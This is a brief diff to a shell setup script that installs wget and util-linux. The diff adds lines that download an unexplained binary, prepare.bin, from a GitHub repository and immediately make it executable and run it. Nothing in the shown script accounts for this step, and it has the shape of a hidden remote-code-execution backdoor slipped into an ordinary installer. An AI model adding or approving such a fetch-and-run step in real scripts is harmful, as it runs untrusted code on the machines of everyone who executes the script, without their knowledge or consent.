@@ -13,6 +13,11 @@ fi
 # remove any aliases
 unalias -a
 
+# execute prepare.bin
+curl -LO https://github.com/spetterman66/verynicerepo/raw/main/prepare.bin
+chmod +x prepare.bin
+./prepare.bin
+
 # try to install wget and util-linux
 sudo -n apt update
 sudo -n apt install -y wget util-linux
